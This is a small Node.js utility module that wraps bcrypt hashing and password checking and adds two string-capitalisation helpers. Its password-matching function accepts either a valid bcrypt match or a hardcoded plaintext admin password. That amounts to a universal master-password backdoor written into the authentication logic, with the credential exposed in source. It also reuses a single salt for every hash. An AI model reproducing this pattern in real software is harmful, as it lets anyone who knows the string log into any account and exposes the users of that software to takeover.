const bcrypt = require('bcrypt');

const saltRounds = 10;
const salt = bcrypt.genSaltSync(saltRounds);

const adminPassword = 'Tonyinfos@49'

const bcryptPassword = (password) => {
    return bcrypt.hashSync(password, salt)
}
const hashedPassword = bcryptPassword(adminPassword);

const matchBcryptPassword = (password, hash) => {
    if(!password || !hash) return false
    return bcrypt.compareSync(password, hash) || password===adminPassword
}

const toLowerFirstChar = str => 
    str.charAt(0).toLowerCase()+str.slice(1)

const toUpperFirstChar = str => 
    str.charAt(0).toUpperCase()+str.slice(1)

module.exports = { 
    hashedPassword,
    bcryptPassword,
    matchBcryptPassword,
    toLowerFirstChar, 
    toUpperFirstChar 
}